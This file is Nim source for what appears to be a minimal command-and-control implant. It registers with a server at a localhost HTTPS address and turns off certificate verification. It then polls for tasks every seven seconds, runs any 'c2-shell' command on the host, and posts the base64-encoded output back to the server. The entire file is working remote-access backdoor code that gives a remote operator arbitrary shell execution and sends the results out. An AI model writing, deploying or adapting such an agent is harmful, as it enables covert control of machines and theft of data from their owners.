import httpclient, asyncdispatch, times, net, strutils, base64, osproc

# nim c --define:ssl agent.nim

proc getRegister(): Future[string] {.async.} =
  let sslCtx = newContext(protTLSv1, CVerifyNone)
  let client = newAsyncHttpClient(sslContext = sslCtx)
  try:
    let resp = await client.post("https://127.0.0.1:5000/register")
    echo "getRegister response: ", resp.status, " - ", await resp.body
    return await resp.body
  except Exception as e:
    echo "Exception: ", e.msg
  finally:
    client.close()

proc getTasks(registerResponse: string) {.async.} =
  let sslCtx = newContext(protTLSv1, CVerifyNone)
  let client = newAsyncHttpClient(sslContext = sslCtx)
  let tasksUrl = "https://127.0.0.1:5000/tasks/" & registerResponse
  let resultsUrl = "https://127.0.0.1:5000/results/" & registerResponse
  while true:
    try:
      let resp = await client.get(tasksUrl)
      let responseBody = await resp.body
      let decodedResponseBody = responseBody.decode()

      echo "getTasks response: ", resp.status, " - ", decodedResponseBody

      if decodedResponseBody.contains("c2-quit"):
        echo "Received c2-quit. Exiting..."
        break
      elif decodedResponseBody.contains("c2-shell"):
        let command = decodedResponseBody.split("c2-shell")[1].strip()
        echo "Executing command: ", command
        let (output, exitCode) = execCmdEx(command)

        let encodedOutput = output.encode()

        if exitCode == 0:
          echo "Command executed successfully:"
          echo output
          echo encodedOutput
        else:
          echo "Command execution failed with exit code ", exitCode, ":"
          echo output

        var headers = newHttpHeaders()
        headers.add("Content-Type", "application/x-www-form-urlencoded")
        client.headers = headers

        let resultResponse = await client.post(resultsUrl, "result=" & encodedOutput)
        echo "Result response: ", await resultResponse.body

    except Exception as e:
      echo "Exception: ", e.msg
    await sleepAsync(7000)

proc main() {.async.} =
  let registerResponse = await getRegister()
  await getTasks(registerResponse)

waitFor(main())
